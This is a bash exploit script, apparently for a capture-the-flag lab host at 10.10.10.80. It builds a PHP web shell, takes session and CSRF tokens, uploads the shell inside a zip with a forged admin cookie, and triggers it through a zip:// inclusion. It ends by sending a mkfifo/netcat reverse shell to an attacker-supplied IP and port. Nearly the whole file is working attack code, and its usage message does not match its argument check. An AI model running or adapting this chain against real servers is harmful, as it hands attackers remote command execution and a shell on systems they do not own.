#!/bin/bash

if [ "$#" != "2" ]; then
    echo "$0 [zip file] [shell] [parameter] [ip] [port]"
    echo "$# given"
    exit 1
fi

zip="/tmp/payload.zip"
shell="shell"
shell_path="/tmp/${shell}.php"
param="cmd"
ip=$1
port=$2

# create zip payload
echo "[*] Creating php shell and zip file"
rm -f ${zip} ${shell_path}
echo '<?php echo "<pre>" . system($_GET['cmd']) . "</pre>"; ?>' > ${shell_path}
zip -j /tmp/payload.zip /tmp/shell.php

# Get PHPSESSID and CSRF token from upload page
echo "[*] Getting PHPSESSID and CSRF token from /?op=upload"
tokens=$(curl -sD - http://10.10.10.80/?op=upload -x 127.0.0.1:8080 | grep -e PHPSESSID -e 'name="token"' | sed 's/\n/=/g')

readarray token_array  <<< $tokens
phpid=$(echo "${token_array[0]}" | cut -d';' -f1 | cut -d'=' -f2)
csrf=$(echo "${token_array[1]}" | cut -d'"' -f10)
echo -e "[+] Tokens received:\n  PIPSESSID: ${phpid}\n  CSRF:      ${csrf}"

# Upload zip file, get location
echo "[*] Uploading zip though /?op=upload form"
location=$(curl -X POST -sD - -F "tip=<${zip}" -F "name=a" -F "token=${csrf}" -F "submit=Send Tip!" -x 127.0.0.1:8080 http://10.10.10.80?op=upload -H "Cookie: admin=1; PHPS
ESSID=${phpid}" | grep Location | cut -d' ' -f2)
secret_file=$(echo -n ${location} | cut -d'=' -f3)
echo -e "[+] File uploaded to ${location}"

# Activate callback
url="http://10.10.10.80/"
op="zip://uploads/${ip}/${secret_file//[$'\r\n']}#${shell//[$'\r\n']}"
p="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f"

echo "[*] Initiating callback to ${ip}:${port}"
a=$(curl -s -G "${url}" --data-urlencode "op=${op}" --data-urlencode "${param}=${p}" -x 127.0.0.1:8080)
